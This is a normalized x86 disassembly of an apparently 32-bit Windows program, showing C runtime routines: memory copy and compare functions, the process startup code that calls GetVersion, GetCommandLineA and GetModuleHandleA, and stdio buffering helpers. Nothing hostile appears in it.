test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405b20 ]
jmp [ ecx * 4 + jump_table_405b9c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405c08 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405c08 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_405da0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_405ca8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405da0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405c08 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405c08 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405c08 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405da0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405da0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405da0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405da0 ]
sub_405e00
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405e60 ]
jmp [ ecx * 4 + jump_table_405edc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f48 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405f48 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4060e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_405fe8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4060e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405f48 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4060e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4060e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4060e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4060e0 ]
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_409ca1
pop ecx
test eax eax
jne r-xdata
call sub_408c2c
test eax eax
jne r-xdata
push 0x1c
call sub_406262
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_409970
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40983e
mov [ rw-data ] eax
call sub_4095f1
call sub_409538
call sub_406e10
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_4094e0
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_406262
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401054
mov [ ebp - 0x60 ] eax
push eax
call sub_406e3d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_409368
pop ecx
pop ecx
retn
sub_406342
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_406d15
pop ecx
retn
sub_406371
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_406d15
pop ecx
retn
sub_406394
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_406d76
pop ecx
retn
sub_4063c3
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_406d76
pop ecx
retn
sub_4063e6
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_406342
dec [ esi + 0x4 ]
pop ecx
js r-xdata
push esi
push [ esp + 0x10 ]
call sub_40761f
pop ecx
mov edi eax
pop ecx
mov ecx [ esi ]
mov al [ esp + 0xc ]
movzx edi al
mov [ ecx ] al
inc [ esi ]
jmp r-xdata
push esi
call sub_406394
pop ecx
mov eax edi
pop edi
pop esi
retn
sub_406421
push esi
push [ esp + 0xc ]
call sub_406342
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40644a
push [ esp + 0x18 ]
mov esi eax
call sub_406394
add esp 0x10
mov eax esi
pop esi
retn
sub_40644a
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx 0xffffffff
push esi
je r-xdata
or eax 0xffffffff
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40a12a
pop ecx
test al 0x2
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
dec [ esi ]
mov eax [ esi ]
mov [ eax ] bl
dec [ esi ]
mov eax [ esi ]
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_4064b8
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_406342
dec [ esi + 0x4 ]
pop ecx
js r-xdata
push esi
call sub_408e15
pop ecx
mov edi eax
mov eax [ esi ]
movzx edi [ eax ]
inc eax
mov [ esi ] eax
jmp r-xdata
push esi
call sub_406394
pop ecx
mov eax edi
pop edi
pop esi
retn
sub_4064e9
push [ esp + 0x4 ]
call sub_40a16e
pop ecx
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov edx [ ecx ]
or eax 0xffffffff
and edx [ ecx + 0x4 ]
cmp edx eax
je r-xdata
retn
xor eax eax
sub_406523
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
cmp ebx 0x4
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
push esi
and edi 0xfffffffe
call sub_406342
push esi
call sub_40662f
push esi
call sub_4075f4
and [ esi + 0xc ] 0xc2f3
mov ecx [ esi + 0xc ]
add esp 0xc
test bl 0x4
je r-xdata
cmp edi 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
or ecx 0x4
push 0x2
mov [ esi + 0xc ] ecx
lea eax [ esi + 0x14 ]
pop edi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0x7fffffff
ja r-xdata
or ch 0x5
mov [ esi + 0xc ] ecx
push edi
call sub_40734d
test eax eax
pop ecx
jne r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop edi
pop ebx
leave
retn
test ebx ebx
je r-xdata
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp ebx 0x40
je r-xdata
push esi
call sub_406394
mov eax [ ebp - 0x4 ]
pop ecx
pop esi
sub_4065d2
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
push esi
call sub_406342
push esi
call sub_406601
push esi
mov edi eax
call sub_406394
add esp 0xc
mov eax edi
pop edi
pop esi
retn
push esi
call sub_406694
pop ecx
pop esi
retn
sub_406601
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40662f
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40a3e6
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_40662f
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_407737
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_406694
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_406d15
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_406d76
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_406371
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_4063c3
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_406601
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_406601
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_406738
push esi
push [ esp + 0xc ]
call sub_406342
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_406762
push [ esp + 0x18 ]
mov esi eax
call sub_406394
add esp 0x10
mov ax si
pop esi
retn
sub_406762
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_40a479
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax rw-data
mov ecx eax
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_40a5a0
pop ecx
cmp eax 0xffffffff
pop ecx
jne r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
cmp eax 0x1
jne r-xdata
call sub_406dfe
mov [ eax ] 0x2a
dec [ esi + 0x4 ]
js r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + 0xc ]
push esi
push eax
call sub_40761f
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
inc [ esi ]
movzx eax [ ebp + 0xc ]
jmp r-xdata
movsx eax [ ebp + 0xc ]
push esi
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
movzx eax [ ebp + 0xc ]
or ax 0xffff
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
movsx eax [ ebp + 0xd ]
push esi
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xd ]
mov [ eax ] cl
movzx eax [ ebp + 0xd ]
jmp r-xdata
push eax
call sub_40761f
pop ecx
pop ecx
inc [ esi ]
jmp r-xdata
sub_40685b
push esi
push [ esp + 0xc ]
call sub_406342
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_406885
push [ esp + 0x18 ]
mov esi eax
call sub_406394
add esp 0x10
mov ax si
pop esi
retn
sub_406885
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp bx 0xffff
push esi
je r-xdata
or ax 0xffff
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax [ esi + 0xc ]
test al 0x40
jne r-xdata
push esi
call sub_40a12a
pop ecx
test al 0x2
jne r-xdata
mov ecx [ esi ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi + 0x10 ]
cmp ecx 0xffffffff
je r-xdata
add [ esi + 0x4 ] 0x2
and al 0xef
or al 0x1
add [ esi ] 0xfffffffe
mov [ esi + 0xc ] eax
mov eax [ esi ]
mov [ eax ] bx
mov eax [ esi ]
mov ax [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx rw-data
mov edx ecx
sar edx 0x5
and ecx 0x1f
mov edx [ edx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea ecx [ edx + ecx * 4 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
add ecx 0x2
mov [ esi ] ecx
lea eax [ ebp + 0x8 ]
push ebx
push eax
call sub_40a5a0
pop ecx
cmp eax 0xffffffff
pop ecx
jne r-xdata
test [ ecx + 0x4 ] 0x80
je r-xdata
mov ecx [ esi ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
call sub_406dfe
mov [ eax ] 0x2a
cmp eax 0x1
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
dec [ esi ]
mov ecx [ esi ]
mov dl [ ebp + 0x8 ]
mov [ ecx ] dl
add [ esi + 0x4 ] eax
mov eax [ esi + 0xc ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov ax bx
jmp r-xdata
dec [ esi ]
mov ecx [ esi ]
mov dl [ ebp + 0x9 ]
mov [ ecx ] dl
add ecx eax
mov [ esi ] ecx
sub_406972
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_406342
push esi
call sub_406995
push esi
mov edi eax
call sub_406394
add esp 0xc
mov ax di
pop edi
pop esi
retn
sub_406995
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
test [ esi + 0xc ] 0x40
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push esi
call sub_40a662
pop ecx
mov ecx [ esi ]
mov ax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
jmp r-xdata
mov eax rw-data
mov ecx eax
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
pop edi
pop esi
leave
retn
dec [ esi + 0x4 ]
push 0x1
pop edi
js r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
push esi
call sub_408e15
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] al
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
or ax 0xffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
lea eax [ ebp + 0xa ]
push eax
call sub_40a749
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
dec [ esi + 0x4 ]
js r-xdata
mov ax [ ebp + 0xa ]
jmp r-xdata
call sub_406dfe
mov [ eax ] 0x2a
jmp r-xdata
push esi
call sub_408e15
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
push 0x2
mov [ ebp - 0x3 ] al
pop edi
movsx eax [ ebp - 0x4 ]
push esi
push eax
call sub_406421
pop ecx
pop ecx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_406a86
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_406d15
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40a8b7
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push esi
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_40b612
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_406af0
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
push esi
push eax
call sub_40a8e2
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_406b48
cmp [ ebp - 0x24 ] 0x0
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
call sub_40b669
add esp 0xc
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_406b8b
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
push [ edi ]
call sub_404f30
inc eax
push eax
call sub_40527e
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov [ esi + 0x8 ] 0x1
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi ]
push eax
call sub_4053c0
pop ecx
pop ecx
sub_406bc8
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
mov eax [ edi + 0x8 ]
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
call sub_404f30
inc eax
push eax
call sub_40527e
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
pop ecx
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
push [ edi + 0x4 ]
push eax
call sub_4053c0
pop ecx
pop ecx
jmp r-xdata
sub_406c40
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
